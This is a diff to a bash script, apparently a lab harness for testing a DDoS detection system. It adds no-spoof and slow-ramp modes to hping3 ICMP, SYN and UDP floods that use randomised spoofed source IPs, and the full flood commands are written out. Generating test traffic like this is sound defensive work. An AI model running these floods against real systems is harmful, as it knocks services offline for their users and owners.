@@ -15,9 +15,15 @@
 #   SYN Flood  - TCP SYN packets to port 80 with random source IPs
 #   UDP Flood  - UDP packets to port 53 with random source IPs
 #
+# Modes:
+#   --no-spoof    Use real source IPs (tests source-based blocking + BCP38)
+#   --slow-ramp   Gradual rate increase over 60s (tests rate-of-change features)
+#
 # Usage:
 #   sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --duration 60
 #   sudo bash attack_generator.sh --type all --target 10.0.0.7 --duration 30
+#   sudo bash attack_generator.sh --type syn --target 10.0.0.7 --no-spoof
+#   sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --slow-ramp
 #
 # Requirements:
 #   - hping3 installed
@@ -74,6 +80,8 @@ show_help() {
     echo "  --type TYPE       Attack type: icmp, syn, udp, or all (default: ${DEFAULT_TYPE})"
     echo "  --target IP       Target IP address (default: ${DEFAULT_TARGET})"
     echo "  --duration SECS   Attack duration in seconds (default: ${DEFAULT_DURATION})"
+    echo "  --no-spoof        Use real source IP (no --rand-source)"
+    echo "  --slow-ramp       Gradual rate increase over 60s"
     echo "  --no-confirm      Skip confirmation prompt"
     echo "  -h, --help        Show this help message"
     echo ""
@@ -81,12 +89,19 @@ show_help() {
     echo "  sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --duration 60"
     echo "  sudo bash attack_generator.sh --type syn --target 10.0.0.5 --duration 30"
     echo "  sudo bash attack_generator.sh --type all --target 10.0.0.7 --duration 20"
+    echo "  sudo bash attack_generator.sh --type icmp --target 10.0.0.7 --no-spoof"
+    echo "  sudo bash attack_generator.sh --type syn --target 10.0.0.7 --slow-ramp"
+    echo "  sudo bash attack_generator.sh --type udp --target 10.0.0.7 --no-spoof --slow-ramp"
     echo ""
     echo "Attack Types:"
     echo "  icmp   ICMP Flood  - hping3 -1 --flood --rand-source TARGET"
     echo "  syn    SYN Flood   - hping3 -S --flood -p 80 --rand-source TARGET"
     echo "  udp    UDP Flood   - hping3 --udp --flood -p 53 --rand-source TARGET"
     echo "  all    Run all three types sequentially"
+    echo ""
+    echo "Modes:"
+    echo "  --no-spoof    Omits --rand-source; tests source-based blocking + BCP38"
+    echo "  --slow-ramp   Starts at 10 pps, ramps to flood over 60s; tests pps_delta"
     echo ""
 }
 
@@ -230,28 +245,36 @@ confirm_attack() {
 
 ###############################################################################
 # Function: run_attack
-# Arguments: $1=type, $2=target, $3=duration
+# Arguments: $1=type, $2=target, $3=duration, $4=no_spoof, $5=slow_ramp
 ###############################################################################
 run_attack() {
     local attack_type=$1
     local target=$2
     local duration=$3
+    local no_spoof=${4:-false}
+    local slow_ramp=${5:-false}
     local hping_cmd=""
     local type_label=""
+    local spoof_flag="--rand-source"
+
+    # --no-spoof mode: omit --rand-source (tests source-based blocking + BCP38)
+    if [ "$no_spoof" = true ]; then
+        spoof_flag=""
+    fi
 
     # Build hping3 command based on attack type
     case "$attack_type" in
         icmp)
             type_label="ICMP Flood"
-            hping_cmd="hping3 -1 --flood --rand-source ${target}"
+            hping_cmd="hping3 -1 --flood ${spoof_flag} ${target}"
             ;;
         syn)
             type_label="SYN Flood"
-            hping_cmd="hping3 -S --flood -p 80 --rand-source ${target}"
+            hping_cmd="hping3 -S --flood -p 80 ${spoof_flag} ${target}"
             ;;
         udp)
             type_label="UDP Flood"
-            hping_cmd="hping3 --udp --flood -p 53 --rand-source ${target}"
+            hping_cmd="hping3 --udp --flood -p 53 ${spoof_flag} ${target}"
             ;;
         *)
             echo -e "${RED}[ERROR]${NC} Unknown attack type: ${attack_type}"
@@ -259,6 +282,16 @@ run_attack() {
             exit 1
             ;;
     esac
+
+    # Annotate mode
+    local mode_label=""
+    if [ "$no_spoof" = true ]; then
+        mode_label="${mode_label}[no-spoof] "
+    fi
+    if [ "$slow_ramp" = true ]; then
+        mode_label="${mode_label}[slow-ramp] "
+    fi
+    type_label="${mode_label}${type_label}"
 
     # Display attack details
     print_attack_details "${type_label}" "${target}" "${duration}" "${hping_cmd}"
@@ -271,7 +304,69 @@ run_attack() {
     echo -e "  ${BLUE}[INFO]${NC} Press Ctrl+C to stop early"
     echo ""
 
-    # Run hping3 in the background
+    if [ "$slow_ramp" = true ]; then
+        # --slow-ramp mode: gradual rate increase over 60s
+        # Tests pps_delta, bps_delta, pps_acceleration features (audit 9.7)
+        local ramp_duration=60
+        if [ "$duration" -lt "$ramp_duration" ]; then
+            ramp_duration=$duration
+        fi
+        local ramp_steps=6
+        local step_duration=$((ramp_duration / ramp_steps))
+        local rates=(10 50 200 1000 5000 0)  # 0 = flood mode
+        local step=0
+
+        echo -e "  ${BLUE}[RAMP]${NC} Slow ramp: ${ramp_steps} steps over ${ramp_duration}s"
+        for rate in "${rates[@]}"; do
+            if [ $step -ge $ramp_steps ]; then
+                break
+            fi
+
+            # Kill previous step's hping3
+            pkill -f "hping3.*${target}" 2>/dev/null
+            sleep 0.5
+
+            if [ "$rate" -eq 0 ]; then
+                # Flood mode for final step
+                local step_cmd="${hping_cmd}"
+            else
+                # Rate-limited: replace --flood with -i u$interval
+                local interval=$((1000000 / rate))  # microseconds
+                local step_cmd="${hping_cmd/--flood/-i u${interval}}"
+            fi
+
+            ${step_cmd} >/dev/null 2>&1 &
+            local step_pid=$!
+            ATTACK_PIDS+=("$step_pid")
+
+            echo -e "  ${YELLOW}[RAMP]${NC} Step $((step+1))/${ramp_steps}: " \
+                "rate=${rate:-flood} pps (${step_duration}s)"
+
+            sleep "$step_duration"
+            step=$((step + 1))
+        done
+
+        # Continue at flood rate for remaining duration
+        local remaining_flood=$((duration - ramp_duration))
+        if [ "$remaining_flood" -gt 0 ]; then
+            echo -e "  ${RED}[FLOOD]${NC} Full flood rate for ${remaining_flood}s"
+            pkill -f "hping3.*${target}" 2>/dev/null
+            sleep 0.5
+            ${hping_cmd} >/dev/null 2>&1 &
+            local flood_pid=$!
+            ATTACK_PIDS+=("$flood_pid")
+            sleep "$remaining_flood"
+        fi
+
+        # Cleanup
+        pkill -f "hping3.*${target}" 2>/dev/null
+        echo -e "  ${GREEN}[DONE]${NC} ${type_label} completed (${duration}s)"
+        log_attack "${type_label}" "${target}" "${duration}" "COMPLETED"
+        echo ""
+        return
+    fi
+
+    # Standard mode: run hping3 in the background at flood rate
     ${hping_cmd} >/dev/null 2>&1 &
     local attack_pid=$!
     ATTACK_PIDS+=("$attack_pid")
@@ -314,11 +409,13 @@ run_attack() {
 ###############################################################################
 # Function: run_all_attacks
 # Run all three attack types sequentially
-# Arguments: $1=target, $2=duration (per attack)
+# Arguments: $1=target, $2=duration, $3=no_spoof, $4=slow_ramp
 ###############################################################################
 run_all_attacks() {
     local target=$1
     local duration=$2
+    local no_spoof=${3:-false}
+    local slow_ramp=${4:-false}
 
     echo -e "${BLUE}[INFO]${NC} Running all attack types sequentially"
     echo -e "${BLUE}[INFO]${NC} Duration per attack: ${duration} seconds"
@@ -329,7 +426,7 @@ run_all_attacks() {
     local attack_num=1
     for attack_type in icmp syn udp; do
         echo -e "${BLUE}[${attack_num}/3]${NC} Starting ${attack_type} attack..."
-        run_attack "${attack_type}" "${target}" "${duration}"
+        run_attack "${attack_type}" "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"
 
         # Pause between attacks (except after the last one)
         if [ $attack_num -lt 3 ]; then
@@ -352,6 +449,8 @@ main() {
     local target="${DEFAULT_TARGET}"
     local duration="${DEFAULT_DURATION}"
     local no_confirm=false
+    local no_spoof=false
+    local slow_ramp=false
 
     # Parse command-line arguments
     while [[ $# -gt 0 ]]; do
@@ -367,6 +466,14 @@ main() {
             --duration)
                 duration="$2"
                 shift 2
+                ;;
+            --no-spoof)
+                no_spoof=true
+                shift
+                ;;
+            --slow-ramp)
+                slow_ramp=true
+                shift
                 ;;
             --no-confirm)
                 no_confirm=true
@@ -433,9 +540,9 @@ main() {
 
     # Execute attack(s)
     if [ "$attack_type" = "all" ]; then
-        run_all_attacks "${target}" "${duration}"
+        run_all_attacks "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"
     else
-        run_attack "${attack_type}" "${target}" "${duration}"
+        run_attack "${attack_type}" "${target}" "${duration}" "${no_spoof}" "${slow_ramp}"
     fi
 
     # Final summary
